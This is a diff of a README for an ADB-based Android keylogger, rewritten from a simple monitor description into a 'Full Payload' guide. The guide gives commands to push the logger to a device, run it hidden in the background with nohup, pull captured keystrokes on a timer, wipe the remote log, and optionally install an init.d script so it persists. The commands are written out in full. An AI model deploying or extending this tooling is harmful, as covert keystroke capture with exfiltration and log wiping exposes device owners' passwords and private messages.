@@ -1,61 +1,69 @@
-# Android Keylogger (ADB-based)
+# Android Keylogger — Full Payload
 
-Monitors raw Linux input events on an Android device via ADB and logs all key presses.
+Full ADB-based keylogger for Android sandbox testing. No APK, no install — runs entirely via `adb shell`.
 
-## How it works
+## Files
 
-- Connects to the device via `adb shell`
-- Streams raw bytes from `/dev/input/eventX`
-- Decodes `input_event` structs (supports both 32-bit and 64-bit Android)
-- Filters `EV_KEY` events and maps keycodes to characters
-- Writes timestamped log entries to a file
+| File | Description |
+|---|---|
+| `keylogger.py` | Main keylogger — Python, full modifier/caps tracking, auto-exfil |
+| `keylogger_sh.sh` | Shell fallback — for devices without Python (uses `dd` + `od` + `awk`) |
+| `deploy.sh` | One-shot deploy script — pushes + launches everything on device |
+| `exfil.sh` | Log puller — one-shot or watch mode, optional remote wipe |
 
-## Requirements
+## Quick Start
 
-- Python 3.10+
-- `adb` in PATH
-- USB debugging enabled on target device (or ADB over TCP/IP)
-- Device must allow reading `/dev/input/eventX` (root helps, but some devices expose it without root)
-
-## Usage
-
+### 1. Connect device
 ```bash
-# Auto-detect event node, log to keylog.txt
-python keylogger.py
+# USB
+adb devices
 
-# Specific device serial + specific event node
-python keylogger.py --serial emulator-5554 --event event1 --out /tmp/keys.txt
-
-# ADB over TCP (wireless)
+# Or WiFi (Android 11+ native, or via USB first)
+adb tcpip 5555
 adb connect 192.168.1.100:5555
-python keylogger.py --serial 192.168.1.100:5555
 ```
 
-## Arguments
-
-| Argument   | Default      | Description                              |
-|------------|--------------|------------------------------------------|
-| `--serial` | *(empty)*    | ADB device serial. Omit for single device|
-| `--event`  | *(auto)*     | Input event node (e.g. `event1`)         |
-| `--out`    | `keylog.txt` | Output log file path                     |
-
-## Finding the right event node
-
+### 2. Deploy + launch
 ```bash
-adb shell cat /proc/bus/input/devices
+chmod +x deploy.sh
+./deploy.sh
+```
+This will:
+- Detect the correct `/dev/input/eventX` node
+- Push `keylogger.py` to `/data/local/tmp/`
+- Start it in the background via `nohup`
+- Fall back to `keylogger_sh.sh` if Python is not on device
+
+### 3. Pull logs
+```bash
+# Pull once
+./exfil.sh
+
+# Watch mode — pull every 30s
+./exfil.sh --watch 30
+
+# Pull + wipe remote log
+./exfil.sh --watch 60 --clean
 ```
 
-Look for a device with `EV=` bitmask that has bit 1 set (keyboard). The script auto-detects this.
-
-## Output format
-
+### 4. Manual run (Python)
+```bash
+# Push and run directly
+adb push keylogger.py /data/local/tmp/
+adb shell "nohup python3 /data/local/tmp/keylogger.py --event event1 --out /data/local/tmp/kl.txt --exfil 0 > /dev/null 2>&1 &"
 ```
-=== Session start: 2026-04-15T13:00:00.000 ===
-[13:00:01.123] h
-[13:00:01.210] e
-[13:00:01.305] l
-[13:00:01.401] l
-[13:00:01.498] o
-[13:00:01.600] [SPACE]
-=== Session end: 2026-04-15T13:05:00.000 ===
+
+### 5. Stop
+```bash
+adb shell "pkill -f keylogger.py"
+# or
+adb shell "kill <PID>"
 ```
+
+## Notes
+
+- **No root required** on most Android emulators (AVD) — `/dev/input/*` is readable by shell
+- **Physical devices** may need root or a debuggable build
+- **Python** is available on most Android 7+ devices via Termux or system Python; shell fallback handles the rest
+- `deploy.sh` sets `PERSIST=0` by default — set to `1` to install an `init.d` startup script (requires root)
+- Log path default: `/data/local/tmp/kl.txt`
